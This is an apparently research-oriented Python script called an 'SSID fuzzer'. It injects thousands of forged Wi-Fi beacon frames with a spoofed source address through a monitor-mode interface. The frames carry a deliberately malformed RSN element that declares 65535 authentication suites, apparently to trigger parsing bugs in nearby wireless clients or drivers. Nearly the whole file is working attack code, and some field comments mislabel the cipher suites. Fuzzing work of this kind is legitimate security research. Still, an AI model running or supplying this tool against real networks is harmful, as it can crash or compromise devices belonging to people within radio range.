#!/usr/bin/env python
# SSID fuzzer


import sys
import time
import struct
import PyLorcon2

def beaconFrameGenerator():
    sequence = 0
    while(1):
        sequence = sequence % 4096

        # Frame Control
        frame = '\x80' # Version: 0 - Type: Managment - Subtype: Beacon
        frame += '\x00' # Flags: 0
        frame += '\x00\x00' # Duration: 0
        frame += '\xff\xff\xff\xff\xff\xff' # Destination: ff:ff:ff:ff:ff:ff
        frame += '\x00\x00\x00\x15\xde\xad' # Source: 00:00:00:15:de:ad
        frame += '\x00\x00\x00\x15\xde\xad' # BSSID: 00:00:00:15:de:ad
        frame += struct.pack('H', sequence) # Fragment: 0 - Sequenence:
#part of the generator
        # Frame Body
        frame += struct.pack('Q', time.time()) # Timestamp
        frame += '\x64\x00' # Beacon Interval: 0.102400 seconds
        frame += '\x11\x04' # Capability Information: ESS, Privacy,
#Short Slot time
        # Information Elements
        # SSID: buggy
        frame += '\x00\x05buggy'
        # Supported Rates: 1,2,5.5,11,18,24,36,54
        frame += '\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c'
        # DS Parameter Set: 6
        frame += '\x03\x01\x06'
        # RSN IE
        frame += '\x30' # ID: 48
        frame += '\x14' # Size: 20
        frame += '\x01\x00' # Version: 1
        frame += '\x00\x0f\xac\x04' # Group cipher suite: TKIP
        frame += '\x01\x00' # Pairwise cipher suite count: 1
        frame += '\x00\x0f\xac\x00' # Pairwise cipher suite 1: TKIP
        frame += '\xff\xff' # Authentication suites count: 65535
        frame += '\x00\x0f\xac\x02' # Pairwise authentication suite 2: PSK
        frame += '\x00\x00'

        sequence += 1
        yield frame

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "Usage:"
        print "\t%s <wireless interface>" % sys.argv[0]
        sys.exit(-1)

    iface = sys.argv[1]
    context = PyLorcon2.Context(iface)
    context.open_injmon()

    generator = beaconFrameGenerator()

    for i in range(10000):
        frame = generator.next()
        time.sleep(0.100)
        context.send_bytes(frame)